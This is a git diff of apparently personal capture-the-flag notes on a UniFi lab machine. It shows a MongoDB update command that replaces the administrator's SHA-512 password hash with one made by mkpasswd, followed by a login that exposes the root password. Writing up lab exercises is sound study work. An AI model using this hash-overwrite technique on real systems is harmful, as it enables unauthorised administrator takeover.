@@ -115,7 +115,8 @@ A DTSCONFIG file is an XML configuration file used to apply property values to S
 
 # we identified the x_shadow field as a shadow file hash `sha512crypt $6$, SHA512 (Unix) 2` in hashcat
 # *instead of cracking it,* we use the update command to change the hash generated using `mkpasswd -m sha-512 P3@ceW1thHTB` and log in as administrator the unifi network administrator console
-`db.admin.update(
+```
+db.admin.update(
 	{
 		"_id":ObjectId("61ce278f46e0fb0012d47ee4")
 	}
@@ -124,8 +125,13 @@ A DTSCONFIG file is an XML configuration file used to apply property values to S
 			"x_shadow" : "$6$zyPslwl.HhmblRYH$.39gZbIPfAdOa1IxGeP16F0jarpNztFp5pMyeLAi0HuviqjpQdyd/X7te0Z6fpKNIZ6zP0aBoHriM7yg5OOL60"
 		}
 	}
-)`
-# *after loggin in,* we find that we can view the root user password in the device authentication section under `Settings > Site`
+)
+```
+# *after loggin in,* we started **EXPLORING THE APP FUNCTIONALITY** and we find that we can view the root user password in the `device authentication` section under `Settings > Site`
+
+-------------------------------------------------------------------------------------
+
+
 
 -------------------------------------------------------------------------------------
 
